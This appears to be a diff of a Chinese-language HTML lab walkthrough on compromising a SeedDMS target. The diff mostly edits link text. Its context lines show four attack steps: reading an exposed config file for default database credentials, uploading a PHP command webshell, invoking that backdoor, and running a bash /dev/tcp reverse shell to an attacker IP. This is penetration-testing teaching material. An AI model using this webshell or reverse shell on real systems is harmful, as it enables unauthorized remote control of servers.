@@ -448,7 +448,8 @@
 <p>查看配置文件，发现了数据库连接信息，有默认账户名密码。</p>
 <p><img src="/posts/3bf2f4be/image-20221117142937586.png"></p>
 <p>因为把SeedDMS下载到本地，我们知道配置文件的路径为：seeddms主目录&#x2F;conf&#x2F;settings.xml</p>
-<p>这里访问：<a target="_blank" rel="noopener" href="http://192.168.71.149/seeddms51x/conf/settings.xml%EF%BC%8C%E5%B0%9D%E8%AF%95%E6%98%AF%E5%90%A6%E5%8F%AF%E4%BB%A5%E6%9F%A5%E7%9C%8B%E9%9D%B6%E6%9C%BA%E7%9A%84%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E3%80%82">http://192.168.71.149/seeddms51x/conf/settings.xml，尝试是否可以查看靶机的配置文件。</a></p>
+<p>这里访问：<a target="_blank" rel="noopener" href="http://192.168.71.149/seeddms51x/conf/settings.xml%EF%BC%8C">http://192.168.71.149/seeddms51x/conf/settings.xml，</a></p>
+<p>尝试是否可以查看靶机的配置文件。</p>
 <p><img src="/posts/3bf2f4be/image-20221117143927232.png"></p>
 <p>可以成功读取靶机配置文件，发现数据库账户密码没改，还是seeddms：seeddms</p>
 <h2 id="3-SeedDMS数据库"><a href="#3-SeedDMS数据库" class="headerlink" title="3.SeedDMS数据库"></a>3.SeedDMS数据库</h2><p>用账密信息连接数据库</p>
@@ -470,7 +471,6 @@
 <p>登录成功！</p>
 <h2 id="4-SeedDMS漏洞利用"><a href="#4-SeedDMS漏洞利用" class="headerlink" title="4.SeedDMS漏洞利用"></a>4.SeedDMS漏洞利用</h2><p>还记得之前搜索公开漏洞时，有两个RCE漏洞是PHP文件上传的，可以尝试一下在该版本中是否可以利用。</p>
 <p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/47022">exploit-db上的漏洞利用</a></p>
-<p>漏洞利用步骤：</p>
 <h3 id="新建后门文档"><a href="#新建后门文档" class="headerlink" title="新建后门文档"></a>新建后门文档</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 
 <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
@@ -488,7 +488,7 @@
 <p><img src="/posts/3bf2f4be/image-20221117154951403.png"></p>
 <p>系统会把上传的文件放在\seeddms51x\data\1048576\”ID“\1.php(你上传的文件会被重命名为1.php)。查看文档信息，显示文档ID为5。</p>
 <p><img src="/posts/3bf2f4be/image-20221117155435424.png"></p>
-<h3 id="调用后门"><a href="#调用后门" class="headerlink" title="调用后门"></a>调用后门</h3><p>访问<a target="_blank" rel="noopener" href="http://192.168.71.149/seeddms51x/data/1048576/5/1.php%EF%BC%8C%E8%B0%83%E7%94%A8php%E5%90%8E%E9%97%A8%E6%88%90%E5%8A%9F%E3%80%82">http://192.168.71.149/seeddms51x/data/1048576/5/1.php，调用php后门成功。</a></p>
+<h3 id="调用后门"><a href="#调用后门" class="headerlink" title="调用后门"></a>调用后门</h3><p>访问<a target="_blank" rel="noopener" href="http://192.168.71.149/seeddms51x/data/1048576/5/1.php%EF%BC%8C">http://192.168.71.149/seeddms51x/data/1048576/5/1.php，</a> 调用php后门成功。</p>
 <p><img src="/posts/3bf2f4be/image-20221117161304085.png"></p>
 <h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>反弹shell命令</p>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">bash</span> <span class="token parameter variable">-c</span> <span class="token string">'exec bash -i >&amp; /dev/tcp/192.168.71.139/4444 0>&amp;1'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
